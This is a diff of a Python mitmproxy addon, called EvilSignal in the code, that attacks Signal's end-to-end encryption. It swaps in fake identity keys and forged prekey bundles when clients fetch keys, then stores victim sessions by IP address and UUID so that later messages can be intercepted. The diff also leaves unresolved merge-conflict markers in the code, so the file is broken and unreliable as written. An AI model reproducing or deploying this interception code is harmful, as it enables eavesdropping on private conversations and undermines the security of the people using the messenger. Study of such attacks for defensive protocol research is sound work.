@@ -112,7 +112,7 @@ class BobIdenKey():
 
 
 registration_info: dict[str, RegistrationInfo] = None
-# conversation_session = dict()
+conversation_session = dict()
 bobs_bundle = dict()
 f = open('registration_info.json', 'wb')
 f.write(b"{}")
@@ -120,6 +120,7 @@ f.close()
 
 api = addons[0]
 
+<<<<<<< HEAD
 class EvilSignal(InterceptedAPI):
     wrapped_api = None
 
@@ -173,6 +174,14 @@ class EvilSignal(InterceptedAPI):
         super().load(loader) # pass remaining to
 
 api = EvilSignal(api)
+=======
+# ctx.options.add_option(
+#     name="conversation_session",
+#     typespec=dict,
+#     default=dict(),
+#     help="chat sessions",
+# )
+>>>>>>> b3b0986 (Message received but invalid Kyber prekey identifier received)
 
 def json_to_reginfo(json_registations: str) -> dict[str, RegistrationInfo]:
     loaded_dict = json.loads(json_registations)
@@ -466,11 +475,11 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         if not identity_key:
             # todo create row
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id))
+            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id), pre_key_id= bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"], kyber_pre_key_id=bundle["pqPreKey"]["keyId"])
             identity_key = fakeUser.identity_key_pair
 
         else:
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id), identity_key=identity_key.fake_identityKey)
+            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id), pre_key_id= bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"], kyber_pre_key_id=bundle["pqPreKey"]["keyId"], identity_key=identity_key.fake_identityKey)
             identity_key = identity_key.fake_identityKey
 
         fakeBundle = fakeUser.pre_key_bundle.to_dict()
@@ -548,9 +557,14 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
     resp.update(fakeBundle_wire)
 
+<<<<<<< HEAD
     # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
     ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
     logging.warning(f"session {ctx.options.conversation_session}")
+=======
+    conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
+    logging.warning(f"session {conversation_session}")
+>>>>>>> b3b0986 (Message received but invalid Kyber prekey identifier received)
 
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
@@ -659,9 +673,9 @@ def _v1_ws_message(flow, identifier):
 
     identifier, destination = strip_uuid_and_id(destination_user)
 
-    logging.warning(ctx.options.conversation_session)
+    logging.warning(conversation_session)
 
-    session = ctx.options.conversation_session.get(f"{ip_address}:{destination}")
+    session = conversation_session.get(f"{ip_address}:{destination}")
 
     if session:
         fakeVictim, fakeUser = session
